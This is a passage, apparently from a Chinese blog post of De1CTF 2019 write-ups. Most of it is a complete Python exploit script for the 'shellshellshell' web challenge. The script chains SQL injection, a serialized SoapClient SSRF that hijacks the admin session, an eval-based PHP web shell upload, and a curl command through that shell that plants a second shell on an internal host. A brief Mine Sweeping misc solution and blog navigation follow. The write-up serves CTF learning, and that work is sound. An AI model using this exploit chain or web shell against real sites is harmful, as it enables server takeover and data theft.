class="string">&#x27;index.php?action=profile&#x27;</span> <span class="keyword">in</span> post_res.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[Login]: &#123;&#125; !! Login Success! \n&quot;</span>.<span class="built_in">format</span>(username))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(post_res.text)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取payload</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mood</span>():</span><br><span class="line">    admin_sessionid,code = get_admin_session()</span><br><span class="line">    data = <span class="string">&#x27;username=admin&amp;password=jaivypassword&amp;code=&#x27;</span> + code</span><br><span class="line">    ssrf = <span class="string">&quot;yue\r\nContent-Type: application/x-www-form-urlencoded\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: PHPSESSID=&#123;phpsessid&#125;\r\nContent-Length: &#123;length&#125;\r\n\r\n&#123;data&#125;&quot;</span>.<span class="built_in">format</span>(phpsessid=admin_sessionid,length=<span class="built_in">len</span>(data),data=data)</span><br><span class="line">    mood = <span class="string">&#x27;O:10:&quot;SoapClient&quot;:4:&#123;&#123;s:3:&quot;uri&quot;;s:4:&quot;aaab&quot;;s:8:&quot;location&quot;;s:39:&quot;http://127.0.0.1/index.php?action=login&quot;;s:11:&quot;_user_agent&quot;;s:&#123;ssrf_len&#125;:&quot;&#123;_ssrf&#125;&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(ssrf_len=<span class="built_in">len</span>(ssrf),_ssrf=ssrf)</span><br><span class="line">    mood = mood.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> mood,admin_sessionid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用该链接存在的sql注入打入ssrf 获取admin的sessionid</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">publish</span>():</span><br><span class="line">    url = target + <span class="string">&#x27;publish&#x27;</span></span><br><span class="line">    mood,admin_sessionid = get_mood()</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;signature&#x27;</span>:<span class="string">&#x27;aaa`,0x&#123;&#125;)-- -&#x27;</span>.<span class="built_in">format</span>(mood),</span><br><span class="line">        <span class="string">&#x27;mood&#x27;</span>:<span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = sess.post(url,data=data)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[admin sessid]: &#x27;</span> + admin_sessionid + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    sess.get(target+<span class="string">&#x27;index&#x27;</span>) <span class="comment">#执行漏洞 获取admin</span></span><br><span class="line">    <span class="keyword">return</span> admin_sessionid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    res = sess.get(target + <span class="string">&#x27;logout&#x27;</span>)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    <span class="built_in">print</span>(res.request.headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个sesionid作为admin session ,返回phpsessid,code</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_admin_session</span>():</span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    res = sess.get(target + <span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">    phpsessid = re.findall(<span class="string">&#x27;PHPSESSID=(\w+);&#x27;</span>,res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">    code = get_code(res.text)</span><br><span class="line">    <span class="keyword">return</span> phpsessid,code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机生成usename和password</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_name_and_pwd</span>():</span><br><span class="line">    username = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_lowercase,<span class="number">8</span>))</span><br><span class="line">    password = username</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[username,password]: &#123;&#125;,&#123;&#125; \n&quot;</span>.<span class="built_in">format</span>(username,password))</span><br><span class="line">    <span class="keyword">return</span> username,password</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传shell1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">admin_sessionid</span>):</span><br><span class="line">    files = &#123;<span class="string">&#x27;pic&#x27;</span>:(<span class="string">&#x27;a2.php&#x27;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[&quot;yue&quot;]);?&gt;&#x27;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    res = requests.post(target + <span class="string">&#x27;publish&#x27;</span>,files=files,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:admin_sessionid&#125;)</span><br><span class="line">    shell_url = _action+<span class="string">&#x27;upload/a2.php&#x27;</span></span><br><span class="line">    <span class="comment"># print(res.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[upload]: success!&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[shell]: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(shell_url))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[upload]: failed! Please check your admin sessionid!&#x27;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> shell_url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    _action = <span class="string">&#x27;http://web69.node1.buuoj.cn/&#x27;</span></span><br><span class="line">    target = _action + <span class="string">&#x27;index.php?action=&#x27;</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;*&#x27;</span> * <span class="number">30</span> + <span class="string">&quot; Username Password &quot;</span> + <span class="string">&#x27;*&#x27;</span> * <span class="number">30</span>)</span><br><span class="line">    username,password = get_name_and_pwd() <span class="comment">#username=admin&amp;password=jaivypassword</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;*&#x27;</span> * <span class="number">30</span> + <span class="string">&quot; Register &quot;</span> + <span class="string">&#x27;*&#x27;</span> * <span class="number">30</span>)</span><br><span class="line">    register(username,password)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;*&#x27;</span> * <span class="number">30</span> + <span class="string">&quot; Login &quot;</span> + <span class="string">&#x27;*&#x27;</span> * <span class="number">30</span>)</span><br><span class="line">    login(username,password)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;*&#x27;</span> * <span class="number">30</span> + <span class="string">&quot; Publish &quot;</span> + <span class="string">&#x27;*&#x27;</span> * <span class="number">30</span>)</span><br><span class="line">    admin_sessionid = publish()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;*&#x27;</span> * <span class="number">30</span> + <span class="string">&quot; Admin Upload &quot;</span> + <span class="string">&#x27;*&#x27;</span> * <span class="number">30</span>)</span><br><span class="line">    shell_url = upload(admin_sessionid)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#上传shell2 </span></span><br><span class="line">    <span class="comment"># payload = &#x27;&#x27;&#x27;@&lt;?php system(&quot;ls /etc&quot;) ?&gt;&#x27;&#x27;&#x27; //先用这个payload找到flag文件，再用下面的payload读取flag</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;@&lt;?php system(&quot;cat /etc/flag_is_He4e_89587236.txt&quot;) ?&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">    res_upload = requests.post(target + <span class="string">&#x27;publish&#x27;</span>,files=&#123;<span class="string">&#x27;pic&#x27;</span>:(<span class="string">&#x27;000.php&#x27;</span>,payload,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:admin_sessionid&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 利用shell1在我们能访问的内网上（127.0.0.1）向目标内网传送文件getshell2</span></span><br><span class="line">    <span class="comment">#先传file[1],再传file[0]是为了绕过end(),&quot;file[0]=/../000.php&quot;是为了绕过unlink</span></span><br><span class="line">    curl = <span class="string">&#x27;&#x27;&#x27;curl http://172.16.54.2 -F &quot;file=@/var/www/html/upload/000.php&quot; -F &quot;file[1]=111&quot; -F &quot;file[0]=/../000.php&quot; -F &quot;hello=000.php&quot; &#x27;&#x27;&#x27;</span></span><br><span class="line">    res = sess.post(shell_url,data=&#123;<span class="string">&#x27;yue&#x27;</span>:<span class="string">&#x27;system(&quot;&#123;&#125;&quot;);&#x27;</span>.<span class="built_in">format</span>(curl)&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2019/09/12/De1CTF-wp/2019-08-13_161420.bmp" alt="2019-08-13_161420"></p>
+<p><img src="/2019/09/12/De1CTF-wp/2019-08-16_151855.bmp" alt="2019-08-16_151855"></p>
+<p><img src="/2019/09/12/De1CTF-wp/2019-08-16_152246.bmp" alt="2019-08-16_152246"></p>
+<p><img src="/2019/09/12/De1CTF-wp/2019-08-16_153621.bmp" alt="2019-08-16_153621"></p>
+<p><img src="/2019/09/12/De1CTF-wp/2019-08-16_153706.bmp" alt="2019-08-16_153706"></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Mine-Sweeping"><a href="#Mine-Sweeping" class="headerlink" title="Mine Sweeping"></a>Mine Sweeping</h3><p>附件一个压缩包，下载，是一个扫雷游戏；玩了一下，发现雷的位置是不变的</p>
+<p>然后。。。。。然后。。我就建了一个Excel表，把雷的位置都记了下来。。发现是个二维码。。简直心累。。</p>
+<p>当然还有更好的解决办法（我还是太菜了o(╥﹏╥)o），以后有时间再去研究吧</p>
+<p><img src="/2019/09/12/De1CTF-wp/2019-08-05_101938.bmp" alt="2019-08-05_101938"></p>
+<p>用QR Research扫一下</p>
+<p><img src="/2019/09/12/De1CTF-wp/2019-08-05_102146.bmp" alt="2019-08-05_102146"></p>
+<p>得到一个链接，点进去就是falg。。</p>
+<p><img src="/2019/09/12/De1CTF-wp/2019-08-05_102600.bmp" alt="2019-08-05_102600"></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6170.html">https://www.zhaoj.in/read-6170.html</a> （大佬的很详细哦~，而且web挺全的）</p>
+<p>推荐一个靶场：<a target="_blank" rel="noopener" href="https://buuoj.cn/login?next=/challenges?">https://buuoj.cn/login?next=%2Fchallenges%3F</a> （上面那位大佬维护的，很多题目都有在里面复现，web方向可能会全一点（大佬专web），可以在里面好好玩(๑′ᴗ‵๑) ）</p>
+
+        
+            <div id="toc-article">
+                
+  <div class="widget-wrap" id="toc-wrap">
+    <h3 class="widget-title"><i class="fa fa-toc"></i> 文章目录</h3>
+    <div class="widget">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-Me"><span class="toc-text">SSRF Me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellshellshell"><span class="toc-text">shellshellshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mine-Sweeping"><span class="toc-text">Mine Sweeping</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+
+            </div>
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="https://leonardo-o1.github.io/2019/09/12/De1CTF-wp/">https://leonardo-o1.github.io/2019/09/12/De1CTF-wp/</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+          
+    <div class="social-share">
+      <span>分享到:</span>
+    </div>
+
+
+
+        </div>
+      
+      
+        
+<nav id="article-nav">
+  
+    <a href="/2019/09/10/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">older</strong>
+      <div class="article-nav-title">
+        
+          点击劫持
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/07/26/ueditor-1-4-3-3-net%E7%89%88-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">newer</strong>
+      <div class="article-nav-title">
+        
+          ueditor 1.4.3.3 .net版 任意文件上传漏洞分析与复现
+        
+      </div>
+    </a>
+  
+</nav>
+
+      
+      
+        
+
+
+
+
+
+
+
+
+      
+    </footer>
+  </div>
+</article>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-posts"></i> 最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/08/22/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2021/05/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E7%BB%95waf/">记一次反射型xss绕waf</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/05/%E8%AE%B0%E5%BD%95-python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88SSTI%EF%BC%89bypass/">记录-python模板注入（SSTI）bypass</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/26/ueditor-1-4-3-3-net%E7%89%88-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">ueditor 1.4.3.3 .net版 任意文件上传漏洞分析与复现</a>
+          </li>
+        
+          <li>
+            <a href="/2019/09/12/De1CTF-wp/">De1CTF部分wp</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-tag"></i> 标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/web%E6%BC%8F%E6%B4%9E/" style="font-size: 20px;">web漏洞</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">反序列化</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 20px;">记录</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-classify"></i> 分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E8%AE%B0/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">漏洞学习</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E5%A4%8D%E7%8E%B0/">复现</a><span class="category-list-count">1</span></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-archive"></i> 归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022年</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021年</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020年</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019年</a><span class="archive-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-tag"></i> 标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E/" rel="tag">web漏洞</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a><span class="tag-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+</aside>
+        
+      </div>
+      <a id="totop" href="#top"></a>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      <p>
+        <a href="/sitemap.xml">网站地图</a>
+        <span> | </span><a href="/atom.xml">订阅本站</a>
+        <span> | </span><a href="/about/">联系博主</a>
+      </p>
+      
+        <p>
+          <i class="fa fa-visitors"></i>
+          <i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>
+          ，
+          <i class="fa fa-views"></i>
+          <i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>
+        </p>
+      
+      <p>
+        <span>Copyright &copy; 2024 悦昕.</span>
+        <span>Theme by <a href="https://github.com/chaooo/hexo-theme-BlueLake/" target="_blank">BlueLake.</a></span>
+        <span>Powered by <a href="https://hexo.io/" target="_blank">Hexo.</a></span>
+      </p>
+    </div>
+  </div>
+</footer>
+
+    </div>
+  </div>
+  
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+<script src="/js/search.json.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+  
+<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+    
+<script src="/localshare/js/social-share.js"></script>
+
+    
+<script src="/localshare/js/qrcode.js"></script>
+
+  
+  
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+
+
+
+
+</body>
+</html>
